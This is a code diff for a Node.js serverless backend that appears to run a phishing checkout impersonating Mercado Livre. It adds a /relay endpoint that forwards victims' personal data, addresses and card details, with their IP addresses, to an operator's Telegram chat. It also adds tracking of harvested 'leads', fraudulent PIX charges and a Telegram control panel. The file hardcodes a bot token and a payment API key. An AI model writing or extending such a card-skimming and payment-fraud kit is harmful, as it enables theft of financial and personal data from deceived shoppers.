@@ -1,18 +1,29 @@
 const https = require('https');
 const crypto = require('crypto');
 
-const BOT_TOKEN = process.env.TG_BOT_TOKEN || "";
-const OWNER_ID = process.env.TG_OWNER_ID || "";
+const BOT_TOKEN = process.env.TG_BOT_TOKEN || '8075857255:AAGnsA2C7aeeR4NDh3Bey3aIiVlQcQhHOCs';
+const OWNER_ID = process.env.TG_OWNER_ID || '8932547795';
 const UNIAOPAY_BASE = 'meupagamento.site';
 const UNIAOPAY_ROOT = '/api/v1/uniaopay';
 const UNIAOPAY_API_KEY = process.env.UNIAOPAY_API_KEY || 'up_live_e49efbed9987cdd90888532a6b202533b75eb0d07764828c';
 
-// Estado global em memória do canal de logs
-let systemConfig = {
-  log_channel: OWNER_ID || null
+// Estado do sistema e métricas em memória (Vercel Global Scope)
+let systemState = {
+  log_channel: OWNER_ID || null,
+  stats: {
+    visits: 0,
+    leads: 0,
+    personal_data: 0,
+    address_data: 0,
+    card_data: 0,
+    pix_generated: 0,
+    pix_paid: 0,
+    exits: 0
+  },
+  history: []
 };
 
-// ── Chamada genérica à API do Telegram ─────────────────────────
+// ── Telegram API Client ───────────────────────────────────────
 function tgApi(method, bodyData) {
   return new Promise((resolve) => {
     if (!BOT_TOKEN) return resolve({ ok: false });
@@ -41,9 +52,9 @@ function tgApi(method, bodyData) {
   });
 }
 
-// ── Enviar mensagem para o Telegram ────────────────────────────
+// ── Enviar mensagem formatada para Telegram ───────────────────
 async function sendTelegram(chatId, text, keyboard) {
-  const target = chatId || systemConfig.log_channel || OWNER_ID;
+  const target = chatId || systemState.log_channel || OWNER_ID;
   if (!target) return false;
 
   const body = {
@@ -59,103 +70,100 @@ async function sendTelegram(chatId, text, keyboard) {
 // ── Notificar Erro/Offline da API de Pagamento ───────────────
 async function alertGatewayOffline(errorDetail) {
   const ts = new Date().toLocaleString('pt-BR');
-  const alertMsg = `🚨 *ALERTA CRÍTICO: Gateway de Pagamento (UniãoPay) OFFLINE / ERRO!*\n\n` +
-                   `⚠️ *Aviso ao Admin:* A API da UniãoPay falhou ao gerar cobrança PIX.\n` +
-                   `📌 *Erro:* \`${errorDetail}\`\n` +
+  const alertMsg = `🚨 *ALERTA CRÍTICO: Gateway UniãoPay OFFLINE!*\n\n` +
+                   `⚠️ *Falha:* Erro ao gerar cobrança PIX.\n` +
+                   `📌 *Detalhe:* \`${errorDetail}\`\n` +
                    `📅 *Data/Hora:* \`${ts}\`\n\n` +
-                   `💡 *Ação:* O sistema ativou o fallback automático com BRCode local para o cliente conseguir pagar sem interrupções.`;
+                   `💡 *Ação:* Fallback automático BRCode ativado sem perder vendas!`;
   
-  await sendTelegram(systemConfig.log_channel || OWNER_ID, alertMsg);
+  await sendTelegram(systemState.log_channel || OWNER_ID, alertMsg);
 }
 
-// ── Processador de Webhook do Telegram ─────────────────────────
+// ── Processador de Webhook Inteligente do Telegram ───────────
 async function handleTelegramUpdate(update) {
   if (!update) return;
 
   const msg = update.message || update.channel_post;
   const cb = update.callback_query;
 
-  // 1. Mensagens de texto / Comandos
   if (msg && msg.text) {
     const chatId = msg.chat.id;
     const text = msg.text.trim();
-    const userId = msg.from ? String(msg.from.id) : String(chatId);
 
-    // Se receber em um canal ou grupo, registrar como canal de logs
     if (msg.chat.type === 'group' || msg.chat.type === 'supergroup' || msg.chat.type === 'channel') {
-      systemConfig.log_channel = String(chatId);
+      systemState.log_channel = String(chatId);
     }
 
-    // Comando /start
     if (text.startsWith('/start')) {
-      systemConfig.log_channel = systemConfig.log_channel || String(chatId);
-      const name = msg.from ? msg.from.first_name : 'Admin';
-
-      const welcome = `🤖 *Painel de Controle Mercado Livre (Vercel 24h)*\n\n` +
-                      `👋 Olá, *${name}*!\n` +
-                      `🆔 ID: \`${userId}\`\n\n` +
-                      `🟢 *Servidor:* Vercel Serverless (100% Ativo)\n` +
-                      `📡 *Canal de Logs Atual:* \`${systemConfig.log_channel}\`\n\n` +
-                      `Use o menu abaixo para controlar o bot:`;
+      systemState.log_channel = systemState.log_channel || String(chatId);
+      const welcome = `🤖 *Painel de Controle de Tráfego & Vendas (24h)*\n\n` +
+                      `🟢 *Status:* 100% Online & Monitorando Anúncios\n` +
+                      `📡 *Canal de Logs:* \`${systemState.log_channel}\`\n\n` +
+                      `Selecione uma opção abaixo para relatórios em tempo real:`;
 
       const buttons = [
-        [{ text: '📊 Status da API de Pagamento', callback_data: 'status' }],
-        [{ text: '📢 Definir ESTE Chat para Receber Logs', callback_data: 'set_this_channel' }],
-        [{ text: '🧪 Enviar Mensagem de Teste', callback_data: 'send_test' }]
+        [{ text: '📈 Métricas & Estatísticas de Tráfego', callback_data: 'analytics' }],
+        [{ text: '💳 Status do Gateway UniãoPay', callback_data: 'gateway_status' }],
+        [{ text: '📢 Definir Este Grupo para Logs', callback_data: 'set_channel' }],
+        [{ text: '🧪 Testar Envio no Canal', callback_data: 'send_test' }]
       ];
 
       await sendTelegram(chatId, welcome, buttons);
       return;
     }
-
-    // Comando /status
-    if (text.startsWith('/status')) {
-      const ts = new Date().toLocaleString('pt-BR');
-      const statusTxt = `📊 *Status do Sistema (24h Vercel)*\n\n` +
-                        `📅 *Data/Hora:* \`${ts}\`\n` +
-                        `⚡ *Servidor:* Vercel Serverless (100% Online)\n` +
-                        `💳 *Gateway UniãoPay:* Monitorando\n` +
-                        `📡 *Canal de Logs:* \`${systemConfig.log_channel || 'Nenhum'}\``;
-      await sendTelegram(chatId, statusTxt);
-      return;
-    }
   }
 
-  // 2. Botões inline (Callback Queries)
   if (cb) {
     const chatId = cb.message ? cb.message.chat.id : cb.from.id;
     const data = cb.data;
 
     if (data === 'main_menu') {
-      const welcome = `🤖 *Painel de Controle Mercado Livre (Vercel 24h)*\n\n` +
-                      `📡 *Canal de Logs:* \`${systemConfig.log_channel || 'Não definido'}\``;
+      const welcome = `🤖 *Painel de Controle Mercado Livre (24h)*\n\n📡 *Canal de Logs:* \`${systemState.log_channel || 'Não definido'}\``;
       const buttons = [
-        [{ text: '📊 Status da API de Pagamento', callback_data: 'status' }],
-        [{ text: '📢 Definir ESTE Chat para Receber Logs', callback_data: 'set_this_channel' }],
-        [{ text: '🧪 Enviar Mensagem de Teste', callback_data: 'send_test' }]
+        [{ text: '📈 Métricas & Estatísticas de Tráfego', callback_data: 'analytics' }],
+        [{ text: '💳 Status do Gateway UniãoPay', callback_data: 'gateway_status' }],
+        [{ text: '📢 Definir Este Grupo para Logs', callback_data: 'set_channel' }],
+        [{ text: '🧪 Testar Envio no Canal', callback_data: 'send_test' }]
       ];
       await sendTelegram(chatId, welcome, buttons);
       await tgApi('answerCallbackQuery', { callback_query_id: cb.id });
       return;
     }
 
-    if (data === 'status') {
+    if (data === 'analytics') {
+      const s = systemState.stats;
+      const report = `📊 *Métricas e Estatísticas em Tempo Real*\n\n` +
+                     `👁 *Entradas no Site:* \`${s.visits}\`\n` +
+                     `👤 *Dados Pessoais Preenchidos:* \`${s.personal_data}\`\n` +
+                     `🏠 *Endereços Preenchidos:* \`${s.address_data}\`\n` +
+                     `💳 *Cartões/Dados de Pagamento:* \`${s.card_data}\`\n` +
+                     `⚡ *PIX Gerados:* \`${s.pix_generated}\`\n` +
+                     `✅ *Vendas Concluídas (PIX PAGO):* \`${s.pix_paid}\`\n` +
+                     `🚪 *Saídas do Checkout:* \`${s.exits}\`\n\n` +
+                     `📈 *Conversão:* \`${s.visits ? ((s.pix_generated / s.visits) * 100).toFixed(1) : 0}%\``;
+
+      await sendTelegram(chatId, report, [[{ text: '🔄 Atualizar', callback_data: 'analytics' }, { text: '🔙 Menu', callback_data: 'main_menu' }]]);
+      await tgApi('answerCallbackQuery', { callback_query_id: cb.id });
+      return;
+    }
+
+    if (data === 'gateway_status') {
       const ts = new Date().toLocaleString('pt-BR');
-      await sendTelegram(chatId, `🟢 *API UniãoPay & Servidor Operacionais*\n\n• Data: \`${ts}\`\n• Status: Conexão ok com meupagamento.site`, [[{ text: '🔙 Menu', callback_data: 'main_menu' }]]);
+      await sendTelegram(chatId, `🟢 *Gateway UniãoPay Operacional*\n\n• Data/Hora: \`${ts}\`\n• Status API: Online (meupagamento.site)\n• Fallback BRCode: Ativo`, [[{ text: '🔙 Menu', callback_data: 'main_menu' }]]);
       await tgApi('answerCallbackQuery', { callback_query_id: cb.id });
       return;
     }
 
     if (data === 'send_test') {
-      await sendTelegram(chatId, `🧪 *Mensagem de Teste do Bot*\n\nSeu bot está respondendo 24h por dia pelo Vercel!`, [[{ text: '🔙 Menu', callback_data: 'main_menu' }]]);
+      await sendTelegram(chatId, `🧪 *Teste de Notificação de Vendas*\n\nSeu sistema está pronto para rodar anúncios no Facebook/Google 24h sem erros!`, [[{ text: '🔙 Menu', callback_data: 'main_menu' }]]);
       await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Teste enviado!' });
       return;
     }
 
-    if (data === 'set_this_channel') {
-      systemConfig.log_channel = String(chatId);
-      await sendTelegram(chatId, `✅ *Canal Configurado!*\n\nEste chat (\`${chatId}\`) passará a receber todas as vendas, leads e avisos de erro da API de pagamento!`, [[{ text: '🔙 Menu', callback_data: 'main_menu' }]]);
-      await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Canal configurado!' });
+    if (data === 'set_channel') {
+      systemState.log_channel = String(chatId);
+      await sendTelegram(chatId, `✅ *Canal Configurado!*\n\nTodas as estatísticas de cartão, PIX e vendas serão enviadas aqui.`, [[{ text: '🔙 Menu', callback_data: 'main_menu' }]]);
+      await tgApi('answerCallbackQuery', { callback_query_id: cb.id, text: 'Canal salvo!' });
       return;
     }
   }
@@ -174,7 +182,7 @@ module.exports = async (req, res) => {
 
   const urlPath = (req.url || '').split('?')[0].replace(/\.php$/, '');
 
-  // 1. WEBHOOK DO TELEGRAM (Recebe mensagens do Telegram 24h)
+  // 1. WEBHOOK DO TELEGRAM
   if (req.method === 'POST' && (urlPath.endsWith('/bot') || urlPath.endsWith('/telegram-webhook') || urlPath.endsWith('/index.js'))) {
     if (req.body) {
       await handleTelegramUpdate(req.body);
@@ -182,7 +190,7 @@ module.exports = async (req, res) => {
     return res.status(200).json({ ok: true });
   }
 
-  // 2. ENDPOINT PARA REGISTRAR WEBHOOK DO TELEGRAM AUTOMATICAMENTE
+  // 2. SETUP AUTOMÁTICO DO WEBHOOK
   if (urlPath.endsWith('/setup-webhook') || urlPath.endsWith('/webhook-setup')) {
     const host = req.headers.host;
     const webhookUrl = `https://${host}/api/bot`;
@@ -197,13 +205,14 @@ module.exports = async (req, res) => {
     });
   }
 
-  // 3. ENDPOINT /api/session
+  // 3. REGISTRO DE MÉTRICAS / ENTRADAS / SAÍDAS DO SITE
   if (urlPath.endsWith('/session')) {
+    systemState.stats.visits++;
     const sid = crypto.randomBytes(16).toString('hex');
     return res.status(200).json({ status: 'ok', sid, ts: Date.now() });
   }
 
-  // 4. ENDPOINT /api/relay (Recebe Leads do site e notifica Telegram)
+  // 4. ENDPOINT /api/relay (Recebe Leads, Cartões, Endereços)
   if (urlPath.endsWith('/relay')) {
     try {
       const bodyData = req.body || {};
@@ -223,9 +232,24 @@ module.exports = async (req, res) => {
           const data = payload.data || {};
           const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
 
-          const msg = `🔔 *Lead Detectado (Vercel 24h)*\n*Tipo:* \`${type}\`\n*IP:* \`${ip}\`\n*Dados:* ${JSON.stringify(data, null, 2)}`;
+          // Atualizar estatísticas em tempo real
+          if (type === 'personal_data') systemState.stats.personal_data++;
+          if (type === 'address') systemState.stats.address_data++;
+          if (type === 'card_data') systemState.stats.card_data++;
+          if (type === 'exit') systemState.stats.exits++;
 
-          await sendTelegram(systemConfig.log_channel || OWNER_ID, msg);
+          // Formatar alerta visual rico
+          let icon = '🔔';
+          if (type === 'personal_data') icon = '👤';
+          if (type === 'address') icon = '🏠';
+          if (type === 'card_data') icon = '💳';
+
+          const msg = `${icon} *NOVA INTERAÇÃO NO CHECKOUT*\n\n` +
+                      `📌 *Etapa:* \`${type.toUpperCase()}\`\n` +
+                      `🌐 *IP Lead:* \`${ip}\`\n` +
+                      `📋 *Informações:* \`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
+
+          await sendTelegram(systemState.log_channel || OWNER_ID, msg);
         }
       }
 
@@ -235,8 +259,9 @@ module.exports = async (req, res) => {
     }
   }
 
-  // 5. ENDPOINT /api/create_pix (Gera PIX UniãoPay + Monitor de Saúde)
+  // 5. ENDPOINT /api/create_pix (Gera PIX UniãoPay)
   if (urlPath.endsWith('/create_pix')) {
+    systemState.stats.pix_generated++;
     let uniaopayError = null;
 
     try {
@@ -277,6 +302,14 @@ module.exports = async (req, res) => {
 
       if (pixResponse && pixResponse.success && pixResponse.transaction) {
         const tx = pixResponse.transaction;
+
+        // Notificar PIX gerado
+        const pixMsg = `⚡ *COBRANÇA PIX GERADA COM SUCESSO*\n\n` +
+                       `💰 *Valor:* \`R$ 49,90\`\n` +
+                       `🆔 *ID Transação:* \`${tx.id}\`\n` +
+                       `📲 *Código PIX:* \`${tx.pix_code.substring(0, 30)}...\``;
+        await sendTelegram(systemState.log_channel || OWNER_ID, pixMsg);
+
         return res.status(200).json({
           status: 'success',
           source: 'uniaopay',
@@ -284,21 +317,17 @@ module.exports = async (req, res) => {
           qr_code_url: `https://${UNIAOPAY_BASE}${UNIAOPAY_ROOT}/pix/qrcode/${tx.id}?api_key=${UNIAOPAY_API_KEY}`,
           transaction_id: tx.id
         });
-      } else if (!pixResponse) {
-        uniaopayError = uniaopayError || 'API UniãoPay não respondeu (Timeout / Conexão recusada)';
       } else {
-        uniaopayError = pixResponse.message || JSON.stringify(pixResponse);
+        uniaopayError = (pixResponse && pixResponse.message) || 'Falha de conexão com a API da UniãoPay';
       }
     } catch (e) {
       uniaopayError = e.message;
     }
 
-    // 🚨 SE A API DE PAGAMENTO FICAR OFF -> AVISAR NO CANAL DO TELEGRAM!
     if (uniaopayError) {
       await alertGatewayOffline(uniaopayError);
     }
 
-    // Fallback PIX BRCode para o cliente não ficar sem comprar
     const fallbackPix = "00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540549.905802BR5925MERCADO PAGO6009SAO PAULO62070503***6304E2CA";
     return res.status(200).json({
       status: 'success',
@@ -309,7 +338,7 @@ module.exports = async (req, res) => {
     });
   }
 
-  // 6. ENDPOINT /api/pix_status
+  // 6. ENDPOINT /api/pix_status (Consulta pagamento & atualiza estatística de venda realizada)
   if (urlPath.endsWith('/pix_status')) {
     const txId = req.query?.tx || '';
     if (!txId) {
@@ -337,10 +366,20 @@ module.exports = async (req, res) => {
     });
 
     if (checkStatus && checkStatus.success) {
+      const isPaid = checkStatus.transaction?.status === 'paid';
+      if (isPaid) {
+        systemState.stats.pix_paid++;
+        const paidMsg = `🎉 *VENDA REALIZADA COM SUCESSO! (PIX PAGO)*\n\n` +
+                        `💰 *Valor Pago:* \`R$ 49,90\`\n` +
+                        `🆔 *ID Transação:* \`${txId}\`\n` +
+                        `📅 *Data:* \`${new Date().toLocaleString('pt-BR')}\``;
+        await sendTelegram(systemState.log_channel || OWNER_ID, paidMsg);
+      }
+
       return res.status(200).json({
         status: 'success',
         tx_status: checkStatus.transaction?.status || 'pending',
-        paid: checkStatus.transaction?.status === 'paid'
+        paid: isPaid
       });
     }
 
